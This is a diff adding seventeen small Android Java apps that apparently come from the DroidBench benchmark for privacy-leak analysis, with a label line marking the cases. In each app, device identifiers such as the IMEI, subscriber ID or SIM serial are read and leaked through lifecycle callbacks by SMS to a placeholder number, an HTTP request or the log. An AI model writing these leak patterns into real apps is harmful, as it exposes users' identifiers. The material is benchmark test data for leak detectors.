@@ -1,0 +1,923 @@
+[P,P,P,P,P,P,P,P,P,P,P,P,P,P,P,P,P]: https://chat.openai.com/share/a23205d7-dc87-47d2-a3e7-98ea09cfb4d3
+
+//1
+package de.ecspride;
+
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+
+public class ActivityLifecycle1 extends Activity {
+	
+	private static String URL = "http://www.google.de/search?q=";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_activity_lifecycle1);
+        
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		String imei = telephonyManager.getDeviceId(); 
+		URL = URL.concat(imei);
+    }
+
+    @Override
+    protected void onStart(){
+    	super.onStart();
+    	try{
+    		connect();
+    	}catch(Exception ex){
+    		//do nothing
+    	}
+    }
+
+	 private void connect() throws IOException{
+    	URL url = new URL(URL);
+    	HttpURLConnection conn = (HttpURLConnection) url.openConnection(); 
+        conn.setRequestMethod("GET");
+        conn.setDoInput(true);
+        // Starts the query
+        conn.connect();
+    }
+    
+}
+
+```
+//2
+package de.ecspride;
+
+import android.app.Activity;
+import android.telephony.SmsManager;
+
+public class GeneralActivity extends Activity {
+    protected static String imei = null;
+    
+    @Override
+    public void onResume() {
+        super.onResume();
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, imei, null, null); 
+        
+
+    }
+}
+package de.ecspride;
+
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+
+public class MainActivity extends GeneralActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		imei = telephonyManager.getDeviceId(); 
+    }    
+}
+
+```
+//3
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class MainActivity extends Activity {
+	public String s;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+    
+    @Override
+	public void onSaveInstanceState(Bundle outState){
+		 TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		s = telephonyManager.getSubscriberId(); 
+	}
+	
+	@Override 
+	public void onRestoreInstanceState(Bundle outState){
+		SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, s, null, null); 
+	}
+}
+
+```
+//4
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class MainActivity extends Activity {
+	private static String imei = null;
+	
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+
+    @Override
+	public void onPause(){
+		super.onPause();
+		SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, imei, null, null);  
+	}
+	
+	@Override
+	public void onResume(){
+		super.onResume();
+		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		imei = telephonyManager.getDeviceId(); 
+	}
+    
+}
+
+```
+//5
+package edu.mit.activity_saved_state;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+    public static final String KEY = "DroidBench";
+
+    /** Called when the activity is first created. */
+    @Override
+	public void onCreate(Bundle savedInstanceState)
+    {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+
+	if (savedInstanceState != null) {
+
+	    String value = savedInstanceState.getString(KEY);
+	    Log.i("DroidBench", value); 
+	}
+    }
+
+    @Override
+    public void onSaveInstanceState(Bundle savedInstanceState) 
+    {
+	TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId(); 
+
+	savedInstanceState.putString(KEY, imei);
+	
+
+	super.onSaveInstanceState(savedInstanceState);
+    }
+}
+
+```
+//6
+package de.ecspride;
+
+import android.app.Application;
+import android.content.Context;
+import android.telephony.TelephonyManager;
+
+public class ApplicationLifecyle1 extends Application {
+
+	public static String imei;
+	
+	@Override
+	public void onCreate() {
+		super.onCreate();
+		
+		TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		imei = tm.getDeviceId();
+	}
+
+
+
+}
+package de.ecspride;
+
+import de.ecspride.applicationlifecycle1.R;
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+
+public class MainActivity extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+	}
+
+	public void onResume() {
+        super.onResume();
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, ApplicationLifecyle1.imei, null, null);
+}
+
+```
+//7
+package de.ecspride;
+
+import android.app.Application;
+import android.content.Context;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class ApplicationLifecyle2 extends Application {
+
+	private String imei;
+	
+	@Override
+	public void onCreate() {
+		super.onCreate();
+		
+		TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		imei = tm.getDeviceId();
+	}
+
+	@Override
+	public void onLowMemory() {
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, imei, null, null); 
+	}
+
+}
+package de.ecspride;
+
+import android.app.Activity;
+import android.os.Bundle;
+import de.ecspride.applicationlifecycle2.R;
+
+public class MainActivity extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+	}
+
+}
+
+```
+//8
+
+package de.ecspride;
+
+import android.content.ContentValues;
+import android.content.Context;
+import android.database.Cursor;
+import android.net.Uri;
+import android.telephony.TelephonyManager;
+
+public class ContentProvider extends android.content.ContentProvider {
+
+	@Override
+	public int delete(Uri uri, String selection, String[] selectionArgs) {
+		// TODO Auto-generated method stub
+		return 0;
+	}
+
+	@Override
+	public String getType(Uri uri) {
+		// TODO Auto-generated method stub
+		return null;
+	}
+
+	@Override
+	public Uri insert(Uri uri, ContentValues values) {
+		// TODO Auto-generated method stub
+		return null;
+	}
+
+	@Override
+	public boolean onCreate() {
+		TelephonyManager tm = (TelephonyManager) getContext().getSystemService(Context.TELEPHONY_SERVICE);
+		ApplicationLifecyle3.imei = tm.getDeviceId();
+		return false;
+	}
+
+	@Override
+	public Cursor query(Uri uri, String[] projection, String selection,
+			String[] selectionArgs, String sortOrder) {
+		// TODO Auto-generated method stub
+		return null;
+	}
+
+	@Override
+	public int update(Uri uri, ContentValues values, String selection,
+			String[] selectionArgs) {
+		// TODO Auto-generated method stub
+		return 0;
+	}
+
+}
+package de.ecspride;
+
+import android.app.Application;
+import android.telephony.SmsManager;
+
+public class ApplicationLifecyle3 extends Application {
+
+	public static String imei;
+	
+	@Override
+	public void onCreate() {
+		super.onCreate();		
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, imei, null, null); 
+	}
+
+
+}
+package de.ecspride;
+
+import de.ecspride.applicationlifecycle3.R;
+import android.os.Bundle;
+import android.app.Activity;
+import android.view.Menu;
+
+public class MainActivity extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+	}
+
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+		// Inflate the menu; this adds items to the action bar if it is present.
+		getMenuInflater().inflate(R.menu.main, menu);
+		return true;
+	}
+
+}
+
+```
+//9
+
+
+package edu.mit.activity_asynchronous_event_ordering;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+    String imei = "";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);                         	
+    }
+
+    protected void onStop() {
+	Log.i("DroidBench", imei);
+    }	
+
+    protected void onResume() {
+	TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+	imei = mgr.getDeviceId(); 
+    }
+    
+    public void onLowMemory() {
+	imei = "";      
+    }
+}
+
+```
+//10
+
+package de.ecspride;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class TestReceiver extends BroadcastReceiver{
+
+	@Override
+	  public void onReceive(Context context, Intent intent) {
+		 String imei = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); 
+		 int i = 2+3;
+		 if(i == 5){
+				SmsManager sms = SmsManager.getDefault();
+		        sms.sendTextMessage("+49 1234", null, imei, null, null); 
+		 }
+	}
+
+}
+
+
+```
+//11
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.view.Menu;
+
+public class MainActivity extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+		
+		String imei = ((TelephonyManager) getApplicationContext().getSystemService
+				(Context.TELEPHONY_SERVICE)).getDeviceId(); 
+		IntentFilter filter = new IntentFilter();
+		filter.addAction("de.ecspride.MyAction");
+		
+		registerReceiver(new MyReceiver(imei), filter);
+		
+		Intent intent = new Intent();
+		intent.setAction("de.ecspride.MyAction");
+		sendBroadcast(intent);
+	}
+	
+	private class MyReceiver extends BroadcastReceiver {
+		
+		private final String deviceId;
+		
+		public MyReceiver(String deviceId) {
+			this.deviceId = deviceId;
+		}
+
+		@Override
+		public void onReceive(Context context, Intent intent) {
+			Log.d("DroidBench", deviceId);
+		}
+		
+	}
+
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+		// Inflate the menu; this adds items to the action bar if it is present.
+		getMenuInflater().inflate(R.menu.main, menu);
+		return true;
+	}
+
+}
+
+```
+//12
+
+
+
+package edu.mit.event_ordering;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MainActivity extends Activity {
+    String imei = "";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+    
+    @Override
+    public void onLowMemory() { 
+        Log.i("DroidBench", imei);  
+        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        imei = mgr.getDeviceId(); 
+    }
+
+    @Override
+    public void onContentChanged() {
+        imei = "";
+    }
+}
+
+```
+//13
+package de.ecspride;
+
+import android.app.Activity;
+import android.app.Fragment;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+
+public class ExampleFragment extends Fragment {
+	private static String imei = null;
+	
+	@Override
+	public void onActivityCreated(Bundle savedInstanceState) {
+		super.onActivityCreated(savedInstanceState);
+		SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, imei, null, null); 
+	}
+	  
+	  
+	@Override
+	public void onAttach(Activity activity) {
+		super.onAttach(activity);
+		imei = MainActivity.imei;
+	}
+}
+package de.ecspride;
+
+import android.content.Context;
+import android.os.Bundle;
+import android.support.v4.app.FragmentActivity;
+import android.telephony.TelephonyManager;
+import android.view.Menu;
+
+public class MainActivity extends FragmentActivity {
+	public static String imei = null;
+	
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		imei = telephonyManager.getDeviceId();
+		ExampleFragment newFragment = new ExampleFragment();
+		android.app.FragmentTransaction transaction = getFragmentManager().beginTransaction();
+		transaction.add(R.id.fragment_inside, newFragment);
+		transaction.commit();
+	}
+
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+		// Inflate the menu; this adds items to the action bar if it is present.
+		getMenuInflater().inflate(R.menu.main, menu);
+		return true;
+	}
+
+}
+
+```
+//14
+
+
+package edu.mit.fragments;
+
+
+import android.app.Fragment;
+import android.os.Bundle;
+import android.util.Log;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.ViewGroup;
+import android.widget.TextView;
+
+public class ArticleFragment extends Fragment {
+    final static String ARG_POSITION = "position";
+    int mCurrentPosition = -1;
+
+    @Override
+    public View onCreateView(LayoutInflater inflater, ViewGroup container, 
+        Bundle savedInstanceState) {
+
+        if (savedInstanceState != null) {
+            mCurrentPosition = savedInstanceState.getInt(ARG_POSITION);
+        }
+
+        // Inflate the layout for this fragment
+        return inflater.inflate(R.layout.article_view, container, false);
+    }
+
+    @Override
+    public void onStart() {
+        super.onStart();
+        
+        Bundle args = getArguments();
+        if (args != null) {
+
+            updateArticleView(args.getInt(ARG_POSITION), "");
+        } else if (mCurrentPosition != -1) {
+
+            updateArticleView(mCurrentPosition, "");
+        }
+    }
+
+    public void updateArticleView(int position, String value) {
+        TextView article = (TextView) getActivity().findViewById(R.id.article);
+        article.setText(Ipsum.Articles[position]);
+        mCurrentPosition = position;
+
+    Log.i("DroidBench", value); 
+    }
+
+    @Override
+    public void onSaveInstanceState(Bundle outState) {
+        super.onSaveInstanceState(outState);
+
+
+        outState.putInt(ARG_POSITION, mCurrentPosition);
+    }
+}
+
+package edu.mit.fragments;
+
+import android.app.Activity;
+import android.app.ListFragment;
+import android.os.Build;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.view.View;
+import android.widget.ArrayAdapter;
+import android.widget.ListView;
+
+
+public class HeadlinesFragment extends ListFragment {
+    OnHeadlineSelectedListener mCallback;
+
+
+    public interface OnHeadlineSelectedListener {
+
+        public void onArticleSelected(int position, String value);
+    }
+
+    @Override
+    public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+
+        int layout = Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB ?
+                android.R.layout.simple_list_item_activated_1 : android.R.layout.simple_list_item_1;
+
+
+        setListAdapter(new ArrayAdapter<String>(getActivity(), layout, Ipsum.Headlines));
+    }
+
+    @Override
+    public void onStart() {
+        super.onStart();
+
+
+
+        if (getFragmentManager().findFragmentById(R.id.article_fragment) != null) {
+            getListView().setChoiceMode(ListView.CHOICE_MODE_SINGLE);
+        }
+    }
+
+    @Override
+    public void onAttach(Activity activity) {
+        super.onAttach(activity);
+
+
+
+        try {
+            mCallback = (OnHeadlineSelectedListener) activity;
+        } catch (ClassCastException e) {
+            throw new ClassCastException(activity.toString()
+                    + " must implement OnHeadlineSelectedListener");
+        }
+    }
+
+    @Override
+    public void onListItemClick(ListView l, View v, int position, long id) {
+
+
+    Activity activity = (Activity)mCallback;
+
+        TelephonyManager mgr = (TelephonyManager) activity.getSystemService(activity.TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId(); //source
+
+        mCallback.onArticleSelected(position, imei);
+        
+
+        getListView().setItemChecked(position, true);
+    }
+}
+package edu.mit.fragments;
+
+public class Ipsum {
+
+    static String[] Headlines = {
+        "Article One",
+        "Article Two"
+    };
+
+    static String[] Articles = {
+        "Article One\n\nExcepteur pour-over occaecat squid biodiesel umami gastropub, nulla laborum salvia dreamcatcher fanny pack. Ullamco culpa retro ea, trust fund excepteur eiusmod direct trade banksy nisi lo-fi cray messenger bag. Nesciunt esse carles selvage put a bird on it gluten-free, wes anderson ut trust fund twee occupy viral. Laboris small batch scenester pork belly, leggings ut farm-to-table aliquip yr nostrud iphone viral next level. Craft beer dreamcatcher pinterest truffaut ethnic, authentic brunch. Esse single-origin coffee banksy do next level tempor. Velit synth dreamcatcher, magna shoreditch in american apparel messenger bag narwhal PBR ennui farm-to-table.",
+        "Article Two\n\nVinyl williamsburg non velit, master cleanse four loko banh mi. Enim kogi keytar trust fund pop-up portland gentrify. Non ea typewriter dolore deserunt Austin. Ad magna ethical kogi mixtape next level. Aliqua pork belly thundercats, ut pop-up tattooed dreamcatcher kogi accusamus photo booth irony portland. Semiotics brunch ut locavore irure, enim etsy laborum stumptown carles gentrify post-ironic cray. Butcher 3 wolf moon blog synth, vegan carles odd future."
+    };
+}
+
+package edu.mit.fragments;
+
+import edu.mit.fragments.R;
+
+import android.os.Bundle;
+import android.app.Activity;
+import android.app.FragmentTransaction;
+
+public class MainActivity extends Activity 
+        implements HeadlinesFragment.OnHeadlineSelectedListener {
+
+    @Override
+    public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.news_articles);
+
+
+        if (findViewById(R.id.fragment_container) != null) {
+            if (savedInstanceState != null) {
+                return;
+            }
+
+
+            HeadlinesFragment firstFragment = new HeadlinesFragment();
+
+
+
+            firstFragment.setArguments(getIntent().getExtras());
+
+
+            getFragmentManager().beginTransaction()
+                    .add(R.id.fragment_container, firstFragment).commit();
+        }
+    }
+
+    public void onArticleSelected(int position, String value) {
+
+
+        ArticleFragment articleFrag = (ArticleFragment)
+                getFragmentManager().findFragmentById(R.id.article_fragment);
+
+        
+        if (articleFrag != null) {
+
+
+            articleFrag.updateArticleView(position, value);
+        
+        } else {
+
+
+
+            ArticleFragment newFragment = new ArticleFragment();
+            Bundle args = new Bundle();
+            args.putInt(ArticleFragment.ARG_POSITION, position);
+            newFragment.setArguments(args);
+            FragmentTransaction transaction = getFragmentManager().beginTransaction();
+
+
+
+            transaction.replace(R.id.fragment_container, newFragment);
+            transaction.addToBackStack(null);
+
+
+            transaction.commit();
+        }
+    }
+}
+
+
+```
+//15
+package de.ecspride;
+
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.os.IBinder;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+
+public class MainService extends Service {
+	private String secret = null;
+	
+	@Override
+	public int onStartCommand(Intent intent, int flags, int startId) {
+		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		secret = telephonyManager.getSimSerialNumber(); 
+		return 0;
+	}
+
+	@Override
+	public IBinder onBind(Intent intent) {
+		// TODO for communication return IBinder implementation
+		return null;
+	}
+	
+	@Override
+	public void onLowMemory(){
+		SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, secret, null, null);  
+  	}
+
+}
+
+```
+//16
+package edu.mit.service_lifecycle;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MyService extends Service {
+    private String value = "";
+
+    public int onStartCommand(Intent intent, int flags, int startId) {
+	Log.i("DroidBench", value);  
+	
+	TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        value = mgr.getDeviceId(); 
+	return Service.START_NOT_STICKY;
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+	return null;
+    }
+}package edu.mit.service_lifecycle;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.os.Bundle;
+public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+         
+	Intent i = new Intent(this, MyService.class);
+
+	startService(i);
+	
+	Intent i2 = new Intent(this, MyService.class);
+
+	startService(i2);
+    }
+}
+
+```
+//17
+package edu.mit.event_context_shared_pref_listener;
+
+import edu.mit.event_context_shared_pref_listener.R;
+import android.app.Activity;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.content.SharedPreferences;
+
+public class MainActivity extends Activity implements SharedPreferences.OnSharedPreferenceChangeListener {
+    
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+        String imei = mgr.getDeviceId();
+
+        
+        SharedPreferences settings = getSharedPreferences("settings", 0);
+        settings.registerOnSharedPreferenceChangeListener(this);
+        
+        SharedPreferences.Editor editor = settings.edit();
+        editor.putString("imei", imei);
+        
+    }
+
+    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
+        String imei = sharedPreferences.getString(key, "");
+        Log.i("DroidBench", imei);
+    }
+}
+
+```
